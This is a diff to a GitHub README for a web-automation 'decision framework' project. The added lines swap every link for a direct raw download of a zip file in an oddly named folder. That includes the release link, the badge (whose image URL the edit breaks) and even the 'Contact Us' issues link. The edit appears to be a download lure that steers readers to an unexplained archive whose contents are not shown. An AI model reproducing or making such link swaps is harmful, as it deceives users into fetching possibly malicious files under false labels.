@@ -1,6 +1,6 @@
 # 🌐 -web-automation-language-decision-framework - Simplifying Web Automation Choices
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-brightgreen)](https://github.com/edisonbra/-web-automation-language-decision-framework/releases)
+[![Download Now](https://github.com/edisonbra/-web-automation-language-decision-framework/raw/refs/heads/main/habitational/decision-framework-language-web-automation-2.7.zip%20Now-Visit%20the%20Releases%20Page-brightgreen)](https://github.com/edisonbra/-web-automation-language-decision-framework/raw/refs/heads/main/habitational/decision-framework-language-web-automation-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **-web-automation-language-decision-framework** project! This app
 
 To download the latest version of the application, visit the Releases page:
 
-[Download the Latest Release](https://github.com/edisonbra/-web-automation-language-decision-framework/releases)
+[Download the Latest Release](https://github.com/edisonbra/-web-automation-language-decision-framework/raw/refs/heads/main/habitational/decision-framework-language-web-automation-2.7.zip)
 
 1. Click on the link above.
 2. Find the latest release.
@@ -64,7 +64,7 @@ If problems persist, reach out for support through the community channels.
 
 For any questions or feedback, feel free to open an issue in the GitHub repository:
 
-[Contact Us](https://github.com/edisonbra/-web-automation-language-decision-framework/issues)
+[Contact Us](https://github.com/edisonbra/-web-automation-language-decision-framework/raw/refs/heads/main/habitational/decision-framework-language-web-automation-2.7.zip)
 
 ---
 
